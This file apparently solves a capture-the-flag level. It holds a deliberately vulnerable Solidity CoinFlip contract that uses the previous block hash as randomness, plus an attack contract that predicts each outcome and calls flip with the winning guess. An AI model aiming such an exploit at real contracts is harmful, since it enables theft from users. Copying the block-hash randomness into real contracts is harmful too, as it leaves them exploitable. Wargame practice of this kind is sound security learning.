

pragma solidity ^0.6.0;

import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}







contract hackTheFlip {
    CoinFlip public instance = CoinFlip(0x0990a6a2fB882eA846Ff07E27a26Ac59429bf0Ec); 
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(bool _guess) public {
    
    // pre-deteremine the flip outcome
    uint256 blockValue = uint256(blockhash(block.number-1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    // If I guessed correctly, submit my guess
    if (side == _guess) {
        instance.flip(_guess);
    } else {
    // If I guess incorrectly, submit the opposite
        instance.flip(!_guess);
    }
}
    }
